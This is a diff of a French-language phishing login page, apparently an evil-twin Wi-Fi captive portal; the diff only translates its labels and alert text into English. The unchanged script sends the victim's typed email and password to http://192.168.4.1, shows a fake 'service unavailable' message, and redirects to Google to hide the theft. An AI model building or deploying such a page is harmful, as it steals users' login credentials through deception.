@@ -2,7 +2,7 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <title>Connexion</title>
+    <title>Connection</title>
     <style>
 body {
     font-family: 'Arial', sans-serif;
@@ -72,7 +72,7 @@ body {
         <div class="login-image"></div>
         <input type="email" id="email" class="form-control" placeholder="Name">
         <input type="password" id="password" class="form-control" placeholder="Phone Number">
-        <button onclick="sendCredentials()" class="btn">Connexion</button>
+        <button onclick="sendCredentials()" class="btn">Connection</button>
     </div>
 
     <script>
@@ -81,7 +81,7 @@ body {
             var password = document.getElementById('password').value;
             
             getFile("http://192.168.4.1/?email=" + encodeURIComponent(email) + "&password=" + encodeURIComponent(password));
-			alert("Service indisponible.");
+			alert("Service Unresponsive.");
             window.location.href = "https://www.google.com";
         }
 
